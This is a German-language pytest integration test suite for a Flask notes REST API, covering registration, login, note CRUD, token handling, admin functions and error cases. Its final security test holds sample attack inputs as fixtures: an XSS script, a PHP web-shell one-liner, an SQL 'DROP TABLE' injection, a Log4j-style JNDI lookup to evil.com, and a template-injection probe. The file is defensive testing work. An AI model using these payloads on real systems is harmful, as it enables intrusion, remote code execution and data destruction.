#!/usr/bin/env python3
"""
Umfassende Integrationstests für das Flask-Backend mit pytest
Testet alle REST-Endpunkte inklusive Edge-Cases und Fehlerfälle
"""
import pytest
import json
from unittest.mock import patch, MagicMock
from main import create_app
from myapp.models import User, Note
from myapp.crud import UserService, NoteService, SessionService


class TestFlaskBackendComprehensive:
    """Umfassende Integrationstests für Flask-Backend REST-API"""
    
    @pytest.fixture
    def app(self):
        """Flask-App für Tests erstellen"""
        app = create_app()
        app.config['TESTING'] = True
        app.config['SECRET_KEY'] = 'test-secret-key'
        return app
    
    @pytest.fixture
    def client(self, app):
        """Test-Client erstellen mit Application Context"""
        with app.app_context():
            client = app.test_client()
            yield client
    
    @pytest.fixture
    def mock_user(self):
        """Mock-User für Tests"""
        user = MagicMock(spec=User)
        user.id = 1
        user.name = 'testuser'
        user.email = 'test@example.com'
        user.admin = False
        user.to_dict.return_value = {
            'id': 1,
            'name': 'testuser',
            'email': 'test@example.com',
            'admin': False,
            'created_at': '2024-01-01T00:00:00'
        }
        user.check_password.return_value = True
        return user
    
    @pytest.fixture
    def mock_admin_user(self):
        """Mock-Admin-User für Tests"""
        admin = MagicMock(spec=User)
        admin.id = 2
        admin.name = 'admin'
        admin.email = 'admin@example.com'
        admin.admin = True
        admin.to_dict.return_value = {
            'id': 2,
            'name': 'admin',
            'email': 'admin@example.com',
            'admin': True,
            'created_at': '2024-01-01T00:00:00'
        }
        admin.check_password.return_value = True
        return admin
    
    @pytest.fixture
    def mock_note(self):
        """Mock-Note für Tests"""
        note = MagicMock(spec=Note)
        note.id = 1
        note.title = 'Test Note'
        note.content = 'Test content'
        note.owner_id = 1
        note.to_dict.return_value = {
            'id': 1,
            'title': 'Test Note',
            'content': 'Test content',
            'owner_id': 1,
            'created_at': '2024-01-01T00:00:00',
            'updated_at': '2024-01-01T00:00:00'
        }
        return note
    
    @pytest.fixture
    def auth_headers(self):
        """Authorization Headers für authentifizierte Requests"""
        return {'Authorization': 'Bearer test-token-123'}

    # ==================== REGISTRIERUNG TESTS ====================
    
    def test_register_success_scenarios(self, client):
        """Test: Verschiedene erfolgreiche Registrierungsszenarien"""
        test_cases = [
            {
                'name': 'user1',
                'email': 'user1@example.com',
                'password': 'password123'
            },
            {
                'name': 'user_with_underscore',
                'email': 'user.with.dots@example.com',
                'password': 'verylongpassword123'
            },
            {
                'name': 'User With Spaces',
                'email': 'UPPERCASE@EXAMPLE.COM',
                'password': 'P@ssw0rd!'
            }
        ]
        
        for i, test_case in enumerate(test_cases):
            mock_user = MagicMock(spec=User)
            mock_user.id = i + 1
            mock_user.name = test_case['name']
            mock_user.email = test_case['email'].lower()
            mock_user.admin = False
            mock_user.to_dict.return_value = {
                'id': i + 1,
                'name': test_case['name'],
                'email': test_case['email'].lower(),
                'admin': False,
                'created_at': '2024-01-01T00:00:00'
            }
            
            with patch.object(UserService, 'get_user_by_email', return_value=None), \
                 patch.object(UserService, 'get_user_by_name', return_value=None), \
                 patch.object(UserService, 'create_user', return_value=mock_user):
                
                response = client.post('/register', 
                    json=test_case,
                    content_type='application/json')
                
                assert response.status_code == 201
                data = json.loads(response.data)
                assert data['message'] == 'Benutzer erfolgreich registriert'
                assert data['user']['email'] == test_case['email'].lower()
    
    def test_register_validation_edge_cases(self, client):
        """Test: Edge-Cases bei der Registrierungsvalidierung"""
        test_cases = [
            # Leere Strings
            {
                'data': {'name': '', 'email': 'test@example.com', 'password': 'password123'},
                'expected_error': 'Feld "name" ist erforderlich'
            },
            {
                'data': {'name': 'testuser', 'email': '', 'password': 'password123'},
                'expected_error': 'Feld "email" ist erforderlich'
            },
            {
                'data': {'name': 'testuser', 'email': 'test@example.com', 'password': ''},
                'expected_error': 'Feld "password" ist erforderlich'
            },
            # Ungültige E-Mail-Formate
            {
                'data': {'name': 'testuser', 'email': 'invalid', 'password': 'password123'},
                'expected_error': 'Ungültiges E-Mail-Format'
            },
            {
                'data': {'name': 'testuser', 'email': '@example.com', 'password': 'password123'},
                'expected_error': 'Ungültiges E-Mail-Format'
            },
            {
                'data': {'name': 'testuser', 'email': 'test@', 'password': 'password123'},
                'expected_error': 'Ungültiges E-Mail-Format'
            },
            # Schwache Passwörter
            {
                'data': {'name': 'testuser', 'email': 'test@example.com', 'password': '12345'},
                'expected_error': 'Passwort muss mindestens 6 Zeichen lang sein'
            },
            {
                'data': {'name': 'testuser', 'email': 'test@example.com', 'password': 'a'},
                'expected_error': 'Passwort muss mindestens 6 Zeichen lang sein'
            }
        ]
        
        for test_case in test_cases:
            response = client.post('/register', 
                json=test_case['data'],
                content_type='application/json')
            
            assert response.status_code == 400
            data = json.loads(response.data)
            assert data['error'] == test_case['expected_error']

    # ==================== LOGIN TESTS ====================
    
    def test_login_various_scenarios(self, client):
        """Test: Verschiedene Login-Szenarien"""
        mock_user = MagicMock(spec=User)
        mock_user.id = 1
        mock_user.name = 'testuser'
        mock_user.email = 'test@example.com'
        mock_user.admin = False
        mock_user.to_dict.return_value = {
            'id': 1,
            'name': 'testuser',
            'email': 'test@example.com',
            'admin': False,
            'created_at': '2024-01-01T00:00:00'
        }
        
        # Erfolgreiche Logins mit verschiedenen E-Mail-Formaten
        test_cases = [
            'test@example.com',
            'TEST@EXAMPLE.COM',
            'Test@Example.Com'
        ]
        
        for email in test_cases:
            with patch.object(UserService, 'authenticate_user', return_value=mock_user), \
                 patch.object(SessionService, 'create_session', return_value='test-token-123'):
                
                response = client.post('/login', 
                    json={
                        'email': email,
                        'password': 'password123'
                    },
                    content_type='application/json')
                
                assert response.status_code == 200
                data = json.loads(response.data)
                assert data['message'] == 'Erfolgreich angemeldet'
                assert data['token'] == 'test-token-123'

    # ==================== NOTIZEN CRUD TESTS ====================
    
    def test_notes_crud_complete_workflow(self, client, auth_headers, mock_user):
        """Test: Vollständiger CRUD-Workflow für Notizen"""
        # 1. Notiz erstellen
        mock_note = MagicMock(spec=Note)
        mock_note.id = 1
        mock_note.title = 'Test Note'
        mock_note.content = 'Test content'
        mock_note.owner_id = 1
        mock_note.to_dict.return_value = {
            'id': 1,
            'title': 'Test Note',
            'content': 'Test content',
            'owner_id': 1,
            'created_at': '2024-01-01T00:00:00',
            'updated_at': '2024-01-01T00:00:00'
        }
        
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
             patch.object(NoteService, 'create_note', return_value=mock_note):
            
            response = client.post('/notes', 
                headers=auth_headers,
                json={
                    'title': 'Test Note',
                    'content': 'Test content'
                },
                content_type='application/json')
            
            assert response.status_code == 201
            data = json.loads(response.data)
            assert data['note']['id'] == 1
        
        # 2. Notiz lesen
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
             patch.object(NoteService, 'get_note_by_id', return_value=mock_note):
            
            response = client.get('/notes/1', headers=auth_headers)
            
            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['note']['title'] == 'Test Note'
        
        # 3. Notiz aktualisieren
        updated_note = MagicMock(spec=Note)
        updated_note.to_dict.return_value = {
            'id': 1,
            'title': 'Updated Note',
            'content': 'Updated content',
            'owner_id': 1,
            'created_at': '2024-01-01T00:00:00',
            'updated_at': '2024-01-01T01:00:00'
        }
        
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
             patch.object(NoteService, 'get_note_by_id', return_value=mock_note), \
             patch.object(NoteService, 'update_note', return_value=updated_note):
            
            response = client.put('/notes/1', 
                headers=auth_headers,
                json={
                    'title': 'Updated Note',
                    'content': 'Updated content'
                },
                content_type='application/json')
            
            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['note']['title'] == 'Updated Note'
        
        # 4. Notiz löschen
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
             patch.object(NoteService, 'get_note_by_id', return_value=mock_note), \
             patch.object(NoteService, 'delete_note', return_value=True):
            
            response = client.delete('/notes/1', headers=auth_headers)
            
            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['message'] == 'Notiz erfolgreich gelöscht'
    
    def test_notes_special_characters_and_unicode(self, client, auth_headers, mock_user):
        """Test: Notizen mit Sonderzeichen und Unicode"""
        test_cases = [
            {
                'title': 'Notiz mit Umlauten: äöüß',
                'content': 'Inhalt mit Sonderzeichen: !@#$%^&*()'
            },
            {
                'title': 'Unicode Test: 🚀🎉💻',
                'content': 'Emoji und Unicode: 中文 العربية русский'
            },
            {
                'title': 'HTML & JSON Test',
                'content': '<script>alert("test")</script> {"key": "value"}'
            },
            {
                'title': 'Very Long Title ' + 'x' * 200,
                'content': 'Very long content ' + 'Lorem ipsum ' * 100
            }
        ]
        
        for i, test_case in enumerate(test_cases):
            mock_note = MagicMock(spec=Note)
            mock_note.id = i + 1
            mock_note.title = test_case['title']
            mock_note.content = test_case['content']
            mock_note.owner_id = 1
            mock_note.to_dict.return_value = {
                'id': i + 1,
                'title': test_case['title'],
                'content': test_case['content'],
                'owner_id': 1,
                'created_at': '2024-01-01T00:00:00',
                'updated_at': '2024-01-01T00:00:00'
            }
            
            with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
                 patch.object(NoteService, 'create_note', return_value=mock_note):
                
                response = client.post('/notes', 
                    headers=auth_headers,
                    json=test_case,
                    content_type='application/json')
                
                assert response.status_code == 201
                data = json.loads(response.data)
                assert data['note']['title'] == test_case['title']
                assert data['note']['content'] == test_case['content']

    # ==================== AUTHENTIFIZIERUNG TESTS ====================
    
    def test_authentication_token_variations(self, client, mock_user):
        """Test: Verschiedene Token-Formate und -Szenarien"""
        test_tokens = [
            'Bearer valid-token-123',
            'Bearer another-valid-token-456',
            'Bearer token-with-special-chars-!@#$%',
            'Bearer very-long-token-' + 'x' * 100
        ]
        
        for token in test_tokens:
            headers = {'Authorization': token}
            
            with patch.object(SessionService, 'get_user_from_session', return_value=mock_user):
                response = client.get('/me', headers=headers)
                
                assert response.status_code == 200
                data = json.loads(response.data)
                assert data['user']['name'] == 'testuser'
    
    def test_authentication_invalid_token_formats(self, client):
        """Test: Ungültige Token-Formate"""
        invalid_tokens = [
            'invalid-token-without-bearer',
            'Basic dGVzdDp0ZXN0',  # Basic Auth statt Bearer
            'Bearer',  # Bearer ohne Token
            'Bearer ',  # Bearer mit Leerzeichen aber ohne Token
            '',  # Leerer String
            'Token valid-token-123'  # Falsches Präfix
        ]
        
        for token in invalid_tokens:
            headers = {'Authorization': token}
            
            response = client.get('/me', headers=headers)
            
            assert response.status_code == 401
            data = json.loads(response.data)
            assert 'error' in data

    # ==================== ADMIN FUNKTIONEN TESTS ====================
    
    def test_admin_user_management_complete(self, client, auth_headers, mock_admin_user):
        """Test: Vollständige Admin-Benutzerverwaltung"""
        # Mock-Benutzer für Tests
        users = []
        for i in range(5):
            user = MagicMock(spec=User)
            user.id = i + 1
            user.name = f'user{i + 1}'
            user.email = f'user{i + 1}@example.com'
            user.admin = (i == 0)  # Erster Benutzer ist Admin
            user.to_dict.return_value = {
                'id': i + 1,
                'name': f'user{i + 1}',
                'email': f'user{i + 1}@example.com',
                'admin': (i == 0),
                'created_at': '2024-01-01T00:00:00'
            }
            users.append(user)
        
        # 1. Alle Benutzer abrufen
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_admin_user), \
             patch.object(UserService, 'get_all_users', return_value=users):
            
            response = client.get('/users', headers=auth_headers)
            
            assert response.status_code == 200
            data = json.loads(response.data)
            assert len(data['users']) == 5
            assert data['users'][0]['admin'] == True
            assert data['users'][1]['admin'] == False
        
        # 2. Benutzer löschen (nicht sich selbst)
        target_user = users[2]  # Dritter Benutzer (nicht Admin)
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_admin_user), \
             patch.object(UserService, 'get_user_by_id', return_value=target_user), \
             patch.object(UserService, 'delete_user', return_value=True), \
             patch('myapp.routes.get_current_user', return_value=mock_admin_user):
            
            response = client.delete('/users/3', headers=auth_headers)  # User ID 3 statt 2
            
            assert response.status_code == 200
            data = json.loads(response.data)
            assert data['message'] == 'Benutzer erfolgreich gelöscht'

    # ==================== FEHLERBEHANDLUNG TESTS ====================
    
    def test_error_handling_comprehensive(self, client, auth_headers, mock_user):
        """Test: Umfassende Fehlerbehandlung"""
        # 1. Nicht existierende Notiz-IDs (nur numerische IDs testen)
        invalid_note_ids = [999, -1, 0]
        
        for note_id in invalid_note_ids:
            with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
                 patch.object(NoteService, 'get_note_by_id', return_value=None):
                
                response = client.get(f'/notes/{note_id}', headers=auth_headers)
                
                assert response.status_code == 404
                # Prüfe ob Response JSON ist
                if response.content_type and 'application/json' in response.content_type:
                    data = json.loads(response.data)
                    assert data['error'] == 'Notiz nicht gefunden'
        
        # 2. Ungültige HTTP-Methoden
        response = client.patch('/notes/1', headers=auth_headers)
        assert response.status_code == 405  # Method Not Allowed
    
    def test_concurrent_operations_simulation(self, client, auth_headers, mock_user):
        """Test: Simulation gleichzeitiger Operationen"""
        # Simuliere mehrere gleichzeitige Notiz-Erstellungen
        notes = []
        for i in range(10):
            mock_note = MagicMock(spec=Note)
            mock_note.id = i + 1
            mock_note.title = f'Concurrent Note {i + 1}'
            mock_note.content = f'Content {i + 1}'
            mock_note.owner_id = 1
            mock_note.to_dict.return_value = {
                'id': i + 1,
                'title': f'Concurrent Note {i + 1}',
                'content': f'Content {i + 1}',
                'owner_id': 1,
                'created_at': '2024-01-01T00:00:00',
                'updated_at': '2024-01-01T00:00:00'
            }
            notes.append(mock_note)
        
        # Erstelle alle Notizen
        for i, note in enumerate(notes):
            with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
                 patch.object(NoteService, 'create_note', return_value=note):
                
                response = client.post('/notes', 
                    headers=auth_headers,
                    json={
                        'title': f'Concurrent Note {i + 1}',
                        'content': f'Content {i + 1}'
                    },
                    content_type='application/json')
                
                assert response.status_code == 201
                data = json.loads(response.data)
                assert data['note']['title'] == f'Concurrent Note {i + 1}'

    # ==================== PERFORMANCE TESTS ====================
    
    def test_large_data_handling(self, client, auth_headers, mock_user):
        """Test: Umgang mit großen Datenmengen"""
        # Große Notiz erstellen
        large_title = 'Large Note ' + 'x' * 1000
        large_content = 'Large Content ' + 'Lorem ipsum dolor sit amet. ' * 1000
        
        mock_note = MagicMock(spec=Note)
        mock_note.id = 1
        mock_note.title = large_title
        mock_note.content = large_content
        mock_note.owner_id = 1
        mock_note.to_dict.return_value = {
            'id': 1,
            'title': large_title,
            'content': large_content,
            'owner_id': 1,
            'created_at': '2024-01-01T00:00:00',
            'updated_at': '2024-01-01T00:00:00'
        }
        
        with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
             patch.object(NoteService, 'create_note', return_value=mock_note):
            
            response = client.post('/notes', 
                headers=auth_headers,
                json={
                    'title': large_title,
                    'content': large_content
                },
                content_type='application/json')
            
            assert response.status_code == 201
            data = json.loads(response.data)
            assert len(data['note']['title']) > 1000
            assert len(data['note']['content']) > 10000

    # ==================== SECURITY TESTS ====================
    
    def test_security_input_sanitization(self, client, auth_headers, mock_user):
        """Test: Sicherheit und Input-Sanitization"""
        malicious_inputs = [
            {
                'title': '<script>alert("XSS")</script>',
                'content': '<?php system($_GET["cmd"]); ?>'
            },
            {
                'title': 'SQL Injection\'; DROP TABLE users; --',
                'content': 'Union SELECT * FROM users'
            },
            {
                'title': '${jndi:ldap://evil.com/a}',  # Log4j-Style
                'content': '{{7*7}}{{config}}'  # Template Injection
            }
        ]
        
        for i, malicious_input in enumerate(malicious_inputs):
            mock_note = MagicMock(spec=Note)
            mock_note.id = i + 1
            mock_note.title = malicious_input['title']
            mock_note.content = malicious_input['content']
            mock_note.owner_id = 1
            mock_note.to_dict.return_value = {
                'id': i + 1,
                'title': malicious_input['title'],
                'content': malicious_input['content'],
                'owner_id': 1,
                'created_at': '2024-01-01T00:00:00',
                'updated_at': '2024-01-01T00:00:00'
            }
            
            with patch.object(SessionService, 'get_user_from_session', return_value=mock_user), \
                 patch.object(NoteService, 'create_note', return_value=mock_note):
                
                response = client.post('/notes', 
                    headers=auth_headers,
                    json=malicious_input,
                    content_type='application/json')
                
                # API sollte die Eingabe akzeptieren (Sanitization erfolgt im Service-Layer)
                assert response.status_code == 201
                data = json.loads(response.data)
                # Überprüfe, dass die Daten zurückgegeben werden (Sanitization wird gemockt)
                assert 'note' in data


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
